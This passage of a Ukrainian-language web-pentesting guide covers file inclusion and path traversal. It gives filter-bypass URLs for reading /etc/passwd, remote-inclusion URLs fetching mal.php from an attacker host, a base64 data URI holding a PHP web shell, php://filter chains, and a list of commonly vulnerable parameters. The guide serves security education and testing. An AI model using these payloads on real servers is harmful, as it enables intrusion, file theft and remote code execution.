* **–ü–æ—á–∞—Ç–æ–∫ –∑—ñ —à—Ç—É—á–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É**: –¶–µ –∑–∞–≥–∞–ª—å–Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞ –ø–æ—á–∞—Ç–∏ —à–ª—è—Ö –∑ –Ω–µ—ñ—Å–Ω—É—é—á–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `a/`). –¶–µ–π –ø—Ä–∏–π–æ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ –∑–∞–ø–æ–±—ñ–∂–Ω–∏–π –∑–∞—Ö—ñ–¥ –∞–±–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏–º–æ–≥ –ª–æ–≥—ñ–∫–∏ —Ä–æ–∑–±–æ—Ä—É —à–ª—è—Ö—É —Å–µ—Ä–≤–µ—Ä–∞.

–ü—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫ –æ–±—Ä—ñ–∑–∞–Ω–Ω—è —à–ª—è—Ö—É –≤–∞–∂–ª–∏–≤–æ —Ä–æ–∑—É–º—ñ—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É —Ä–æ–∑–±–æ—Ä—É —à–ª—è—Ö—É —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏. –ö–æ–∂–µ–Ω —Å—Ü–µ–Ω–∞—Ä—ñ–π –º–æ–∂–µ –≤–∏–º–∞–≥–∞—Ç–∏ —ñ–Ω—à–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É, —ñ —á–∞—Å—Ç–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è, —â–æ–± –∑–Ω–∞–π—Ç–∏ –Ω–∞–π–µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—à–∏–π –º–µ—Ç–æ–¥.

**–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–∞ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ PHP 5.3.**

### **–ü—Ä–∏–π–æ–º–∏ –æ–±—Ö—ñ–¥—É —Ñ—ñ–ª—å—Ç—Ä—ñ–≤**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## –í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–£ php —Ü–µ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–º–∫–Ω–µ–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ **`allow_url_include`** –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ **Off.** –©–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ, –≤–æ–Ω–æ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ **On**, —ñ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∫–ª—é—á–∏—Ç–∏ —Ñ–∞–π–ª PHP –∑ –≤–∞—à–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
–Ø–∫—â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ **`allow_url_include`** —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –∞–ª–µ PHP **—Ñ—ñ–ª—å—Ç—Ä—É—î** –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫, [–∑–≥—ñ–¥–Ω–æ –∑ —Ü–∏–º –ø–æ—Å—Ç–æ–º](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–æ—Ç–æ–∫–æ–ª –¥–∞–Ω–∏—Ö –∑ base64 –¥–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è b64 PHP –∫–æ–¥—É —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –∫–æ–¥—ñ –æ—Å—Ç–∞–Ω–Ω—ñ–π `+.txt` –±—É–≤ –¥–æ–¥–∞–Ω–∏–π, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–≤—ñ –ø–æ—Ç—Ä—ñ–±–µ–Ω —Ä—è–¥–æ–∫, —è–∫–∏–π –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ `.txt`, —Ç–æ–º—É —Ä—è–¥–æ–∫ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ –Ω—å–æ–≥–æ, —ñ –ø—ñ—Å–ª—è b64 –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è —Ü—è —á–∞—Å—Ç–∏–Ω–∞ –ø–æ–≤–µ—Ä–Ω–µ –ø—Ä–æ—Å—Ç–æ —Å–º—ñ—Ç—Ç—è, –∞ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π PHP-–∫–æ–¥ –±—É–¥–µ –≤–∫–ª—é—á–µ–Ω–∏–π (—ñ, –æ—Ç–∂–µ, –≤–∏–∫–æ–Ω–∞–Ω–∏–π).
{% endhint %}

–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ **–±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—Ä–æ—Ç–æ–∫–æ–ª—É `php://`** –±—É–¥–µ:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## –ö–æ—Ä–µ–Ω–µ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç Python

–£ Python —É –∫–æ–¥—ñ, –ø–æ–¥—ñ–±–Ω–æ–º—É –¥–æ —Ü—å–æ–≥–æ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
–Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–µ—Ä–µ–¥–∞—î **–∞–±—Å–æ–ª—é—Ç–Ω–∏–π —à–ª—è—Ö** –¥–æ **`file_name`**, —Ç–æ **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–ª—è—Ö –ø—Ä–æ—Å—Ç–æ –≤–∏–¥–∞–ª—è—î—Ç—å—Å—è**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
–¶–µ –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ –∑–≥—ñ–¥–Ω–æ –∑ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> –Ø–∫—â–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —î –∞–±—Å–æ–ª—é—Ç–Ω–∏–º —à–ª—è—Ö–æ–º, –≤—Å—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –≤–∏–∫–∏–¥–∞—é—Ç—å—Å—è, —ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –ø—Ä–æ–¥–æ–≤–∂—É—î—Ç—å—Å—è –≤—ñ–¥ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ —à–ª—è—Ö—É.

## –°–ø–∏—Å–æ–∫ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ Java

–ó–¥–∞—î—Ç—å—Å—è, —è–∫—â–æ —É –≤–∞—Å —î –¢—Ä–∞–≤–µ—Ä—Å—ñ—è –®–ª—è—Ö—É –≤ Java —ñ –≤–∏ **–∑–∞–ø–∏—Ç—É—î—Ç–µ –∫–∞—Ç–∞–ª–æ–≥** –∑–∞–º—ñ—Å—Ç—å —Ñ–∞–π–ª—É, –±—É–¥–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∞ **–ø–µ—Ä–µ–ª—ñ–∫ –∫–∞—Ç–∞–ª–æ–≥—É**. –¶—å–æ–≥–æ –Ω–µ –≤—ñ–¥–±—É–¥–µ—Ç—å—Å—è –≤ —ñ–Ω—à–∏—Ö –º–æ–≤–∞—Ö –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è (–Ω–∞—Å–∫—ñ–ª—å–∫–∏ —è –∑–Ω–∞—é).

## –¢–æ–ø-25 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤

–û—Å—å —Å–ø–∏—Å–æ–∫ —Ç–æ–ø-25 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏ –¥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (LFI) (–∑ [–ø–æ—Å–∏–ª–∞–Ω–Ω—è](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–±–≥–æ—Ä—Ç–∫–∏ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ PHP

### php://filter

PHP —Ñ—ñ–ª—å—Ç—Ä–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±–∞–∑–æ–≤—ñ **–æ–ø–µ—Ä–∞—Ü—ñ—ó –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö** –ø–µ—Ä–µ–¥ —Ç–∏–º, —è–∫ –≤–æ–Ω–∏ –±—É–¥—É—Ç—å –ø—Ä–æ—á–∏—Ç–∞–Ω—ñ –∞–±–æ –∑–∞–ø–∏—Å–∞–Ω—ñ. –Ü—Å–Ω—É—î 5 –∫–∞—Ç–µ–≥–æ—Ä—ñ–π —Ñ—ñ–ª—å—Ç—Ä—ñ–≤:

* [–§—ñ–ª—å—Ç—Ä–∏ —Ä—è–¥–∫—ñ–≤](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: –í–∏–¥–∞–ª–µ–Ω–Ω—è —Ç–µ–≥—ñ–≤ –∑ –¥–∞–Ω–∏—Ö (–≤—Å–µ –º—ñ–∂ —Å–∏–º–≤–æ–ª–∞–º–∏ "<" —Ç–∞ ">")
* –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ —Ü–µ–π —Ñ—ñ–ª—å—Ç—Ä –∑–Ω–∏–∫ –∑ —Å—É—á–∞—Å–Ω–∏—Ö –≤–µ—Ä—Å—ñ–π PHP
* [–§—ñ–ª—å—Ç—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : –ü–µ—Ä–µ—Ç–≤–æ—Ä—é—î –Ω–∞ —ñ–Ω—à–∏–π –∫–æ–¥—É–≤–∞–Ω–Ω—è (`convert.iconv.<input_enc>.<output_enc>`). –©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–ø–∏—Å–æ–∫ –≤—Å—ñ—Ö –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–∏—Ö –∫–æ–¥—É–≤–∞–Ω—å**, –≤–∏–∫–æ–Ω–∞–π—Ç–µ –≤ –∫–æ–Ω—Å–æ–ª—ñ: `iconv -l`

{% hint style="warning" %}
–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä–æ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó `convert.iconv.*` –¥–æ–∑–≤–æ–ª—è—î **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ç–µ–∫—Å—Ç**, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –∑–∞–ø–∏—Å—É –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç—É –∞–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –æ–±—Ä–æ–±–ª—è—î –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ç–µ–∫—Å—Ç. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**LFI2RCE —á–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∏ php**](lfi2rce-via-php-filters.md).
{% endhint %}

* [–§—ñ–ª—å—Ç—Ä–∏ —Å—Ç–∏—Å–Ω–µ–Ω–Ω—è](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: –°—Ç–∏—Å–Ω–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –≤–µ–ª–∏–∫–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó)
* `zlib.inflate`: –†–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö
* [–§—ñ–ª—å—Ç—Ä–∏ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : –ó–∞—Å—Ç–∞—Ä—ñ–ª–æ
* `mdecrypt.*` : –ó–∞—Å—Ç–∞—Ä—ñ–ª–æ
* –Ü–Ω—à—ñ —Ñ—ñ–ª—å—Ç—Ä–∏
* –í–∏–∫–æ–Ω–∞–≤—à–∏ –≤ php `var_dump(stream_get_filters());`, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫—ñ–ª—å–∫–∞ **–Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —Ñ—ñ–ª—å—Ç—Ä—ñ–≤**:
* `consumed`
* `dechunk`: —Ä–æ–∑–≥–æ—Ä—Ç–∞—î HTTP chunked –∫–æ–¥—É–≤–∞–Ω–Ω—è
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
–ß–∞—Å—Ç–∏–Ω–∞ "php://filter" –Ω–µ—á—É—Ç–ª–∏–≤–∞ –¥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è php-—Ñ—ñ–ª—å—Ç—Ä—ñ–≤ —è–∫ –æ—Ä–∞–∫—É–ª –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É –±–µ–∑ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ **–±—É–ª–µ–≤–æ–º—É –≤–∏–≤–µ–¥–µ–Ω–Ω—ñ —Ñ–∞–π–ª—É (—Å–∏–º–≤–æ–ª –∑–∞ —Å–∏–º–≤–æ–ª–æ–º) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é php-—Ñ—ñ–ª—å—Ç—Ä—ñ–≤** —è–∫ –æ—Ä–∞–∫—É–ª–∞. –¶–µ —Ç–æ–º—É, —â–æ php-—Ñ—ñ–ª—å—Ç—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ–∫—Å—Ç –Ω–∞—Å—Ç—ñ–ª—å–∫–∏ –≤–µ–ª–∏–∫–∏–º, —â–æ–± php –≤–∏–∫–∏–Ω—É–≤ –≤–∏–Ω—è—Ç–æ–∫.

–£ –≤–∏—Ö—ñ–¥–Ω–æ–º—É –ø–æ—Å—Ç—ñ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –¥–µ—Ç–∞–ª—å–Ω–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫–∏, –∞–ª–µ –æ—Å—å —à–≤–∏–¥–∫–∏–π –æ–≥–ª—è–¥:

* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–¥–µ–∫ **`UCS-4LE`**, —â–æ–± –∑–∞–ª–∏—à–∏—Ç–∏ –≤–µ–¥—É—á–∏–π —Å–∏–º–≤–æ–ª —Ç–µ–∫—Å—Ç—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É —ñ –∑—Ä–æ–±–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä —Ä—è–¥–∫–∞ –µ–∫—Å–ø–æ–Ω–µ–Ω—Ü—ñ–π–Ω–æ –±—ñ–ª—å—à–∏–º.
* –¶–µ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—Ç–µ–∫—Å—Ç—É –Ω–∞—Å—Ç—ñ–ª—å–∫–∏ –≤–µ–ª–∏–∫–æ–≥–æ, –∫–æ–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥–∞–Ω–æ –ø–æ—á–∞—Ç–∫–æ–≤—É –ª—ñ—Ç–µ—Ä—É**, —â–æ php —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å **–ø–æ–º–∏–ª–∫—É**
* –§—ñ–ª—å—Ç—Ä **dechunk** –≤–∏–¥–∞–ª–∏—Ç—å –≤—Å–µ, —è–∫—â–æ –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª –Ω–µ —î —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º, —Ç–æ–º—É –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞—Ç–∏, —á–∏ –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª —î —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º.
* –¶–µ, –≤ –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º (—ñ —ñ–Ω—à–∏–º–∏ —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –≤–≥–∞–¥–∞–Ω–æ—ó –ª—ñ—Ç–µ—Ä–∏), –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –≤–≥–∞–¥–∞—Ç–∏ –ª—ñ—Ç–µ—Ä—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ç–µ–∫—Å—Ç—É, –±–∞—á–∞—á–∏, –∫–æ–ª–∏ –º–∏ –≤–∏–∫–æ–Ω—É—î–º–æ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü—ñ–π, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ –Ω–µ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º —Å–∏–º–≤–æ–ª–æ–º. –¢–æ–º—É —â–æ —è–∫—â–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π, dechunk –Ω–µ –≤–∏–¥–∞–ª–∏—Ç—å –π–æ–≥–æ, —ñ –ø–æ—á–∞—Ç–∫–æ–≤–∞ –±–æ–º–±–∞ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å –ø–æ–º–∏–ª–∫—É php.
* –ö–æ–¥–µ–∫ **convert.iconv.UNICODE.CP930** –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î –∫–æ–∂–Ω—É –ª—ñ—Ç–µ—Ä—É –≤ –Ω–∞—Å—Ç—É–ø–Ω—É (—Ç–∞–∫ –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –∫–æ–¥–µ–∫—É: a -> b). –¶–µ –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –≤–∏—è–≤–∏—Ç–∏, —á–∏ –ø–µ—Ä—à–∞ –ª—ñ—Ç–µ—Ä–∞ - —Ü–µ `a`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ—Å–∫—ñ–ª—å–∫–∏, —è–∫—â–æ –º–∏ –∑–∞—Å—Ç–æ—Å—É—î–º–æ 6 —Ü–∏—Ö –∫–æ–¥–µ–∫—ñ–≤ a->b->c->d->e->f->g, –ª—ñ—Ç–µ—Ä–∞ –≤–∂–µ –Ω–µ —î —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º —Å–∏–º–≤–æ–ª–æ–º, —Ç–æ–º—É dechunk –Ω–µ –≤–∏–¥–∞–ª–∏—Ç—å –π–æ–≥–æ, —ñ —Å–ø—Ä–∞—Ü—é—î –ø–æ–º–∏–ª–∫–∞ php, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –º–Ω–æ–∂–∏—Ç—å—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫–æ–≤—É –±–æ–º–±—É.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—à—ñ —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ **rot13** –Ω–∞ –ø–æ—á–∞—Ç–∫—É, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ñ–Ω—à—ñ —Å–∏–º–≤–æ–ª–∏, —Ç–∞–∫—ñ —è–∫ n, o, p, q, r (—ñ —ñ–Ω—à—ñ –∫–æ–¥–µ–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö –ª—ñ—Ç–µ—Ä –¥–æ –¥—ñ–∞–ø–∞–∑–æ–Ω—É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏—Ö).
* –ö–æ–ª–∏ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π —Å–∏–º–≤–æ–ª - —Ü–µ —á–∏—Å–ª–æ, –π–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–∫–æ–¥—É–≤–∞—Ç–∏ –≤ base64 —ñ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –ø–µ—Ä—à—ñ 2 –ª—ñ—Ç–µ—Ä–∏, —â–æ–± –≤–∏—Ç—ñ–∫–∞—Ç–∏ —á–∏—Å–ª–æ.
* –û—Å—Ç–∞—Ç–æ—á–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —è–∫ **–≤–∏—Ç—ñ–∫–∞—Ç–∏ –±—ñ–ª—å—à–µ, –Ω—ñ–∂ –ø–æ—á–∞—Ç–∫–æ–≤—É –ª—ñ—Ç–µ—Ä—É**. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—ñ–ª—å—Ç—Ä–∏ –ø–∞–º'—è—Ç—ñ –ø–æ—Ä—è–¥–∫—É, —Ç–∞–∫—ñ —è–∫ **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—è–¥–æ–∫ —Å–∏–º–≤–æ–ª—ñ–≤ —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–∞ –ø–µ—Ä—à—ñ–π –ø–æ–∑–∏—Ü—ñ—ó —ñ–Ω—à—ñ –ª—ñ—Ç–µ—Ä–∏ —Ç–µ–∫—Å—Ç—É.
